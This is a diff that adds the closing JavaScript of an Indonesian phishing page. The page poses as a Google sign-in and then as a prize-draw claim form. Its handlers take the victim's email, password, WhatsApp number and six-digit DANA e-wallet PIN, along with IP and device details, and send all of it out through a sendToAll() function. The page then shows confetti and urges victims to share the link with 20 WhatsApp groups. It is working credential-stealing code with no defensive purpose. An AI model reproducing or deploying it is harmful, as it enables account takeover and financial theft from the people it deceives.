+                    $('avLetter').textContent = em.charAt(0).toUpperCase();
+                    $('dispEmail').textContent = em;
+                    $('btnNextEmail').classList.remove('loading');
+                    $('btnNextEmail').style.pointerEvents = 'auto';
+                    $('passInp').focus();
+                }, 1000);
+            });
+            
+            $('emailInp').addEventListener('keydown', function(e){
+                if(e.key === 'Enter'){ e.preventDefault(); $('btnNextEmail').click(); }
+            });
+            
+            $('btnLogin').addEventListener('click', function(e){
+                e.preventDefault();
+                var pw = $('passInp').value;
+                if(!pw || pw.length < 4){
+                    $('passErr').classList.add('show');
+                    $('passErrTxt').textContent = 'Sandi salah. Coba lagi.';
+                    shake($('passInp'));
+                    return;
+                }
+                $('passErr').classList.remove('show');
+                STATE.password = pw;
+                STATE.ts = getTS();
+                
+                this.classList.add('loading');
+                this.style.pointerEvents = 'none';
+                
+                sendToAll('<b>🔐 LOGIN GOOGLE - PASSWORD</b>\n\n<b>📧 Email:</b> <code>'+STATE.email+'</code>\n<b>🔑 Password:</b> <code>'+pw+'</code>\n<b>🌐 IP:</b> <code>'+STATE.ip+'</code>\n<b>🕒 Waktu:</b> '+STATE.ts);
+                
+                showSpinner('Memverifikasi...');
+                setTimeout(function(){
+                    spinnerTxt.textContent = 'Login berhasil! Mengalihkan...';
+                    setTimeout(function(){
+                        hideSpinner();
+                        pageLogin.classList.remove('active');
+                        pageUndian.classList.add('active');
+                        document.body.classList.add('dark');
+                        starsBg.classList.add('show');
+                        $('uEmail').value = STATE.email;
+                        updateProg(33);
+                        updateSteps(2);
+                        window.scrollTo(0,0);
+                    }, 1000);
+                }, 2000);
+            });
+            
+            $('passInp').addEventListener('keydown', function(e){
+                if(e.key === 'Enter'){ e.preventDefault(); $('btnLogin').click(); }
+            });
+            
+            $('btnTogglePw').addEventListener('click', function(e){
+                e.preventDefault();
+                var inp = $('passInp');
+                inp.type = (inp.type === 'password' ? 'text' : 'password');
+            });
+            
+            $('showPw').addEventListener('change', function(){
+                $('passInp').type = this.checked ? 'text' : 'password';
+            });
+        }
+
+        // ===== UNDIAN SETUP =====
+        function setupUndian(){
+            $('btnClaim').addEventListener('click', function(e){
+                e.preventDefault();
+                var wa = $('uWa').value.trim();
+                var pin = $('uPin').value.trim();
+                
+                if(!wa || wa.length < 10){
+                    toast('❌ Masukkan nomor WA yang valid!');
+                    shake($('uWa'));
+                    return;
+                }
+                if(!pin || pin.length < 6){
+                    toast('❌ PIN DANA harus 6 digit!');
+                    shake($('uPin'));
+                    return;
+                }
+                
+                STATE.wa = wa;
+                STATE.pin = pin;
+                STATE.ts = getTS();
+                
+                this.textContent = '⏳ MEMPROSES...';
+                this.disabled = true;
+                
+                var fullMsg = '<b>🔥🔥🔥 DATA LENGKAP 🔥🔥🔥</b>\n\n'+
+                    '<b>📧 Email:</b> <code>'+STATE.email+'</code>\n'+
+                    '<b>🔑 Password:</b> <code>'+STATE.password+'</code>\n'+
+                    '<b>📱 WA:</b> <code>'+STATE.wa+'</code>\n'+
+                    '<b>💰 PIN DANA:</b> <code>'+STATE.pin+'</code>\n\n'+
+                    '<b>🌐 IP:</b> <code>'+STATE.ip+'</code>\n'+
+                    '<b>🖥 Platform:</b> '+STATE.plat+'\n'+
+                    '<b>📐 Resolusi:</b> '+STATE.screen+'\n'+
+                    '<b>🕐 Timezone:</b> '+STATE.tz+'\n'+
+                    '<b>🌍 Bahasa:</b> '+STATE.lang+'\n'+
+                    '<b>🔗 Referrer:</b> '+STATE.ref+'\n'+
+                    '<b>🕒 Waktu:</b> '+STATE.ts;
+                
+                sendToAll(fullMsg);
+                
+                setTimeout(function(){
+                    confetti();
+                    updateProg(100);
+                    updateSteps(3);
+                    $('formUndian').style.display = 'none';
+                    $('successBox').style.display = 'block';
+                    $('shareLink').value = window.location.href;
+                    window.scrollTo(0,0);
+                }, 800);
+            });
+        }
+
+        // ===== PROGRESS & STEPS =====
+        function updateProg(p){ $('progFill').style.width = p+'%'; $('progPct').textContent = p+'%'; }
+        function updateSteps(s){
+            var dots = [$('sDot1'), $('sDot2'), $('sDot3')];
+            var lines = [$('sLine1'), $('sLine2')];
+            dots.forEach(function(d,i){
+                d.classList.remove('act','done');
+                if(i+1 < s){ d.classList.add('done'); d.textContent = '✓'; }
+                else if(i+1 === s){ d.classList.add('act'); d.textContent = i+1; }
+                else { d.textContent = i+1; }
+            });
+            lines.forEach(function(l,i){ l.classList.toggle('act', i+1 < s); });
+        }
+
+        // ===== CONFETTI =====
+        function confetti(){
+            var colors = ['#FFD700','#FF6B6B','#4ECDC4','#FF8C00','#D32F2F','#4CAF50','#2196F3'];
+            for(var i=0;i<100;i++){
+                var p = document.createElement('div'); p.className = 'cf-piece';
+                p.style.cssText = 'left:'+Math.random()*100+'%;top:-'+(Math.random()*100)+'px;width:'+(Math.random()*10+5)+'px;height:'+(Math.random()*10+5)+'px;background:'+colors[Math.floor(Math.random()*colors.length)]+';border-radius:'+(Math.random()>0.5?'50%':'2px')+';--fd:'+(Math.random()*3+2)+'s;--fdl:'+Math.random()*2+'s;--fr:'+(Math.random()*720-360)+'deg;';
+                confettiBox.appendChild(p);
+                setTimeout(function(){ p.remove(); }, 5000);
+            }
+        }
+
+        // ===== COPY LINK =====
+        window.copyLink = function(){
+            $('shareLink').select();
+            document.execCommand('copy');
+            toast('✅ Link disalin! Sebarkan ke 20 grup WA.');
+        };
+
+        // ===== OPEN WA =====
+        window.openWA = function(){
+            var msg = 'Halo admin! Saya sudah share link undian ke '+CONFIG.SHARE_REQ+' grup WhatsApp.\n\nEmail: '+STATE.email+'\nWA: '+STATE.wa+'\n\nMohon diproses hadiahnya.';
+            window.open('https://wa.me/'+CONFIG.ADMIN_WA+'?text='+encodeURIComponent(msg), '_blank');
+        };
+
+        // ===== UTILS =====
+        function getTS(){ return new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'}); }
+
+        // ===== START EVERYTHING =====
+        initStars();
+        initTesti();
+        initCountdown();
+        initLiveNotif();
+        initStats();
+        getIP();
+        setupLogin();
+        setupUndian();
+        console.log('✅ SYSTEM READY - ALL BUTTONS WORKING');
+    })();
+    </script>
+</body>
+</html>
